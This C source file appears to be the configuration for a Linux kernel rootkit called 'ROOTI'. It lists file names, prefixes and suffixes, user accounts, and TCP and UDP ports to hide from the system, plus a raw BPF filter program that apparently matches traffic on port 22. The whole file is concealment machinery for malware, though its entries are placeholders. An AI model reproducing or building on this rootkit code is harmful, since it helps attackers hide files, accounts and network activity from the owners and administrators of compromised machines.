#include "config.h"

/*
    Unfortunately the linux kernel ARRAY_SIZE macro cannot be used to assign the result of the calculation
    to a constant variable because the linux macro includes some magic __must_be_array() term to catch invalid use
    of the macro, thus making the expression not constant.
*/
#define CONST_ARRAY_SIZE(ARR) sizeof(ARR) / sizeof(ARR[0])
#define DECLARE_ARRAY_SIZE(ARR) const size_t ARR##_COUNT = CONST_ARRAY_SIZE(ARR)

const char *ROOTI_HIDDEN_FILES[] = {
    "hideme.txt",
    "dontshowme.txt"
};
DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_FILES);

const char *ROOTI_HIDDEN_FILES_PREFIXES[] = {
    "secret",
    "classified"
};
DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_FILES_PREFIXES);

const char *ROOTI_HIDDEN_FILES_SUFFIXES[] = {
    "secret",
    "classified"
};
DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_FILES_SUFFIXES);

const char *ROOTI_HIDDEN_USERS[] = {
    "omri",
    "omre"
};
DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_USERS);

const unsigned short ROOTI_HIDDEN_TCP_PORTS[] = {
    6060,
    7070
};
DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_TCP_PORTS);

const unsigned short ROOTI_HIDDEN_UDP_PORTS[] = {
    8080,
    9090
};
DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_UDP_PORTS);

struct sock_filter ROOTI_BPF_FILTER_PROGRAM[] = {
    { 0x28, 0, 0, 0x0000000c },
    { 0x15, 0, 6, 0x000086dd },
    { 0x30, 0, 0, 0x00000014 },
    { 0x15, 2, 0, 0x00000084 },
    { 0x15, 1, 0, 0x00000006 },
    { 0x15, 0, 13, 0x00000011 },
    { 0x28, 0, 0, 0x00000038 },
    { 0x15, 10, 11, 0x00000016 },
    { 0x15, 0, 10, 0x00000800 },
    { 0x30, 0, 0, 0x00000017 },
    { 0x15, 2, 0, 0x00000084 },
    { 0x15, 1, 0, 0x00000006 },
    { 0x15, 0, 6, 0x00000011 },
    { 0x28, 0, 0, 0x00000014 },
    { 0x45, 4, 0, 0x00001fff },
    { 0xb1, 0, 0, 0x0000000e },
    { 0x48, 0, 0, 0x00000010 },
    { 0x15, 0, 1, 0x00000016 },
    { 0x6, 0, 0, 0x00000000 },
    { 0x6, 0, 0, 0x00040000 },
};
DECLARE_ARRAY_SIZE(ROOTI_BPF_FILTER_PROGRAM);
